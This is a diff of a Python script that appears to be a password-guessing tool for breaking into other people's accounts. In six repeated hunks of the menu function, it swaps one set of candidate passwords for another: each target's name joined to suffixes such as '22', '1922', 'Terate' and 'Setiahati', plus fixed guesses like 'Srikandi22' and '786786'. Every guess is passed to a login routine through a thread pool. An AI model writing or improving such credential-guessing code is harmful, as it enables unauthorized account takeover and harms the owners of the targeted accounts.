@@ -215,15 +215,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '016',
-                         str(x) + '017',
-                         str(x) + '018',
-                         str(x) + '019'
+                         str(x) + '22',
+                         str(x) + '1922',
+                         str(x) + 'Terate',
+                         str(x) + 'Setiahati'
                          ]
-                    litpas.append('Terate016')
-                    litpas.append('Terate017')
-                    litpas.append('Terate018')
-                    litpas.append('Terate019')
+                    litpas.append('Terate')
+                    litpas.append('Setiahati')
+                    litpas.append('Srikandi22')
+                    litpas.append('Pendekar22')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -249,15 +249,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '016',
-                         str(x) + '017',
-                         str(x) + '018',
-                         str(x) + '019'
+                         str(x) + '22',
+                         str(x) + '1922',
+                         str(x) + 'Terate',
+                         str(x) + 'Setiahati'
                          ]
-                    litpas.append('Terate016')
-                    litpas.append('Terate017')
-                    litpas.append('Terate018')
-                    litpas.append('Terate019')
+                    litpas.append('Terate')
+                    litpas.append('Setiahati')
+                    litpas.append('Srikandi22')
+                    litpas.append('Pendekar22')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -281,15 +281,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '016',
-                           str(x) + '017',
-                           str(x) + '018',
-                           str(x) + '019'
+                           str(x) + '22',
+                           str(x) + '1922',
+                           str(x) + 'Terate',
+                           str(x) + 'Setiahati'
                            ]
-                      litpas.append('Terate016')
-                      litpas.append('Terate017')
-                      litpas.append('Terate018')
-                      litpas.append('Terate019')
+                      litpas.append('Terate')
+                      litpas.append('Setiahati')
+                      litpas.append('Srikandi22')
+                      litpas.append('Pendekar22')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -306,15 +306,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '016',
-                           str(x) + '017',
-                           str(x) + '018',
-                           str(x) + '019'
+                           str(x) + '22',
+                           str(x) + '1922',
+                           str(x) + 'Terate',
+                           str(x) + 'Setiahati'
                            ]
-                      litpas.append('Terate016')
-                      litpas.append('Terate017')
-                      litpas.append('Terate018')
-                      litpas.append('Terate019')
+                      litpas.append('Terate')
+                      litpas.append('Setiahati')
+                      litpas.append('Srikandi22')
+                      litpas.append('Pendekar22')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -331,15 +331,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '016',
-                           str(x) + '017',
-                           str(x) + '018',
-                           str(x) + '019'
+                           str(x) + '22',
+                           str(x) + '1922',
+                           str(x) + 'Terate',
+                           str(x) + 'Setiahati'
                            ]
-                      litpas.append('Terate016')
-                      litpas.append('Terate017')
-                      litpas.append('Terate018')
-                      litpas.append('Terate019')
+                      litpas.append('Terate')
+                      litpas.append('Setiahati')
+                      litpas.append('Srikandi22')
+                      litpas.append('Pendekar22')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -355,15 +355,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '016',
-                           str(x) + '017',
-                           str(x) + '018',
-                           str(x) + '019'
+                           str(x) + '22',
+                           str(x) + '1922',
+                           str(x) + 'Terate',
+                           str(x) + 'Setiahati'
                            ]
-                      litpas.append('Terate016')
-                      litpas.append('Terate017')
-                      litpas.append('Terate018')
-                      litpas.append('Terate019')
+                      litpas.append('Terate')
+                      litpas.append('Setiahati')
+                      litpas.append('Srikandi22')
+                      litpas.append('Pendekar22')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
